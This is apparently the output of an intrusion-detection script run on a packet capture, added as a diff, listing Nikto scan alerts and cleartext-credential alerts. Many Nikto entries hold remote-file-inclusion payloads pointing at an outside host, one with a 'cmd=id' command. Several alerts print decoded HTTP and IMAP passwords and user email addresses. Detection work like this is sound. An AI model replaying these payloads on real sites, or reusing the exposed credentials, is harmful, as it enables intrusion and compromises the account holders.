@@ -1,0 +1,653 @@
+Reading PCAP file set3.pcap...
+ALERT #1: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/suite/index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005889)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #2: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/suite/index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005889)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #3: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/BetaBlockModules/NewestGroupsModule/NewestGroupsModule.php?current_blockmodule_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003924)
+
+)!
+ALERT #4: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/BetaBlockModules/NewestGroupsModule/NewestGroupsModule.php?current_blockmodule_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003924)
+
+)!
+ALERT #5: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Full_Release/include/body_comm.inc.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003982)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #6: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Full_Release/include/body_comm.inc.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003982)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #7: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/penguin/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005957)
+
+)!
+ALERT #8: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/penguin/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005957)
+
+)!
+ALERT #9: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=thomas_ahlqvist@hotmail.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #9: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=thomas_ahlqvist@hotmail.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #9: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Gallery/displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003983)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #10: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Gallery/displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003983)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #11: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/sidebar/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005958)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #12: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/sidebar/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005958)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #13: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Include/lib.inc.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003984)
+
+)!
+ALERT #14: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Include/lib.inc.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003984)
+
+)!
+ALERT #15: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/slashdot/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005959)
+Connection: Keep-Alive
+
+)!
+ALERT #16: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/slashdot/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005959)
+Connection: Keep-Alive
+
+)!
+ALERT #17: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Include/variables.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003985)
+
+)!
+ALERT #18: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Include/variables.php3?Include=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003985)
+
+)!
+ALERT #19: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/stylesheets.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005960)
+Connection: Keep-Alive
+
+)!
+ALERT #20: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/stylesheets.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005960)
+Connection: Keep-Alive
+
+)!
+ALERT #21: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Jobline/admin.jobline.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003986)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #22: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Jobline/admin.jobline.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003986)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #23: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=guest137646@worldboardgames.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #23: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=guest137646@worldboardgames.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #23: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/ListRecords.php?lib_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003987)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #24: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/ListRecords.php?lib_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003987)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #25: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/text-only/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005961)
+Connection: Keep-Alive
+
+)!
+ALERT #26: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/text-only/template.tpl.php?renderer=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005961)
+Connection: Keep-Alive
+
+)!
+ALERT #27: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/tmpl_dfl/scripts/index.php?dir[inc]=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005962)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #28: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/templates/tmpl_dfl/scripts/index.php?dir[inc]=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005962)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #29: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Lorev1/third_party/phpmailer/class.phpmailer.php?lang_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003988)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #30: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Lorev1/third_party/phpmailer/class.phpmailer.php?lang_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003988)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #31: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/breadcrumb.php?rootBase=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005963)
+
+)!
+ALERT #32: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/breadcrumb.php?rootBase=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005963)
+
+)!
+ALERT #33: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/MOD_forum_fields_parse.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003989)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #34: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/MOD_forum_fields_parse.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003989)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #35: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=mightymariner@icloud.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #35: Credentials sent in cleartext with HTTP is detected from 10.144.31.242 (HTTP) (GET /wbg/img/GetAccountPicture.php?email=mightymariner@icloud.com HTTP/1.1
+Host: utils.wbg-server.se:80
+Connection: keep-alive
+Accept: */*
+User-Agent: YatzyWorld/5181 CFNetwork/811.5.4 Darwin/16.6.0
+Accept-Language: da-dk
+Authorization: Basic d2JnYXBwMzEyMTY6UTgyN3dPNjY1NiFuVzk5X2Ex
+Accept-Encoding: gzip, deflate
+
+)!
+Decoded Credentials: wbgapp31216:Q827wO6656!nW99_a1
+
+ALERT #35: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/default.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005964)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #36: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/default.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005964)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #37: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Mamblog/admin.mamblog.php?cfgfile=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003990)
+Connection: Keep-Alive
+
+)!
+ALERT #38: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Mamblog/admin.mamblog.php?cfgfile=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003990)
+Connection: Keep-Alive
+
+)!
+ALERT #39: Credentials sent in cleartext with IMAP is detected from 10.121.12.153 (IMAP) (3 LOGIN ventas@wekiguatemala.com.gt "$Alesgt1.1"
+)!
+ALERT #40: Credentials sent in cleartext with IMAP is detected from 10.121.12.153 (IMAP) (3 LOGIN ventas@wekiguatemala.com.gt "$Alesgt1.1"
+)!
+ALERT #41: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/format.php?_page_content=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005965)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #42: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/format.php?_page_content=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005965)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #43: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Net_DNS_PATH/DNS/RR.php?phpdns_basedir=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003991)
+
+)!
+ALERT #44: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/Net_DNS_PATH/DNS/RR.php?phpdns_basedir=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003991)
+
+)!
+ALERT #45: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003992)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #46: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003992)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #47: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/format.php?_page_css=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005966)
+
+)!
+ALERT #48: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/format.php?_page_css=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005966)
+
+)!
+ALERT #49: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005967)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #50: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005967)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #51: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003993)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #52: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003993)
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #53: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/indexFooter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003994)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #54: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/indexFooter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003994)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #55: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_center.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005968)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #56: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_center.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005968)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #57: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/pages/pageHeader.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003995)
+
+)!
+ALERT #58: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/pages/pageHeader.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003995)
+
+)!
+ALERT #59: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_left.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005969)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #60: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_left.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005969)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #61: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_top.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005970)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #62: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/frames1_top.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005970)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #63: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003996)
+
+)!
+ALERT #64: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003996)
+
+)!
+ALERT #65: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/phpAutoVideo/LightTwoOh/sidebar.php?loadpage=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005971)
+
+)!
+ALERT #66: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/phpAutoVideo/LightTwoOh/sidebar.php?loadpage=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005971)
+
+)!
+ALERT #67: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/FieldManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003997)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #68: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/FieldManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003997)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #69: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/settings.php?pfad_z=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005972)
+
+)!
+ALERT #70: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/settings.php?pfad_z=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005972)
+
+)!
